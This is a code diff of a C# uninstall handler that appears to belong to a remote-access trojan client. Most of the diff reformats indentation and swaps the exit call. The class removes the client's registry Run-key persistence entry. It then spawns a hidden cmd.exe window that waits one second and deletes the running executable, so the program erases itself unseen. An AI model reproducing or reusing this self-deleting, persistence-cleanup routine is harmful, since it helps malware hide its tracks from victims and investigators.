@@ -10,14 +10,14 @@ using System.Text;
 
 namespace Client.Handle_Packet
 {
-   public class HandleUninstall
+    public class HandleUninstall
     {
         public HandleUninstall()
         {
-                if (Convert.ToBoolean(Settings.Install))
+            if (Convert.ToBoolean(Settings.Install))
+            {
+                try
                 {
-                    try
-                    {
                     if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                         Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").DeleteValue(Path.GetFileName(Settings.ClientFullPath));
                     else
@@ -34,25 +34,24 @@ namespace Client.Handle_Packet
                     }
                 }
                 catch { }
-                }
-                ProcessStartInfo Del = null;
-                try
+            }
+            ProcessStartInfo Del = null;
+            try
+            {
+                Del = new ProcessStartInfo()
                 {
-                    Del = new ProcessStartInfo()
-                    {
-                        Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true,
-                        FileName = "cmd.exe"
-                    };
-                }
-                catch { }
-                finally
-                {
-                    Methods.CloseMutex();
-                    Process.Start(Del);
-                    Environment.Exit(0);
-                }
+                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    FileName = "cmd.exe"
+                };
+            }
+            catch { }
+            finally
+            {
+                Process.Start(Del);
+                Methods.ClientExit();
+            }
         }
     }
 }
